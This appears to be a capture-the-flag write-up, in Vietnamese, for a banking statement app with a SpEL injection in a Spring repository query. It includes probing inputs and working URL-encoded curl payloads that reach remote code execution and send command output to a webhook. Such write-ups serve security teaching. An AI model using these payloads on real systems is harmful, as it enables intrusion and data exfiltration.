# FinovaBank Statement Viewer

## Writeups from the teams

- [Team VNDirect](https://manhnv.com/toi-da-dong-gop-gi-de-cung-team-vo-dich-df-cyber-defense-2025-king-of-the-hill)

## SpEL Injection

Ứng dụng cung cấp endpoint `/api/statements/search` với tham số `customerName` để tìm kiếm sao kê. Truy vấn trong repository dùng SpEL nội suy trực tiếp dữ liệu người dùng vào biểu thức:

```java
@Query("{ 'customerName': { $regex: ?#{ \"?0\" }, $options: 'i' } }")
List<Statement> findByCustomerName(String customerName);
```

Điều này khiến input người dùng có thể trở thành một phần của SpEL Expression (biểu thức) và được evaluate.

## Remote Code Execution

- Khi thực hiện pentest blackbox, ta có thể thử ký tự nháy đôi `"` để xem phản ứng của ứng dụng:

```
/api/statements/search?customerName="
/api/statements/search?customerName="a"
```

Ta sẽ thấy các error message dạng `EL1045E`/`EL1041E` từ SpEL.

- Kiểm tra evaluate (URL-encode):

```
/api/statements/search?customerName=%22%2BT(java.lang.Runtime)%2B%22
```

Nếu không còn lỗi và trả 200, chứng tỏ rằng có thể expression đã được evaluate.

- Ví dụ payload RCE tạo outbound request (URL-encode đầy đủ):

```
/api/statements/search?customerName=%22%2BT(java.lang.Runtime).getRuntime().exec('/bin/bash%20-c%20{wget,https://<your-webhook-url>?x=%60{echo,$({ls,/})}%60}')%2B%22
```

## Quick POC using curl

```bash
# 1) Lỗi parser
curl -s "http://<host>/api/statements/search?customerName=%22"

# 2) Evaluate expression
curl -s "http://<host>/api/statements/search?customerName=%22%2BT(java.lang.Runtime)%2B%22"

# 3) Outbound RCE
curl -s "http://<host>/api/statements/search?customerName=%22%2BT(java.lang.Runtime).getRuntime().exec('/bin/bash%20-c%20{wget,https://<your-webhook-url>?x=%60{echo,$({ls,/})}%60}')%2B%22"
```
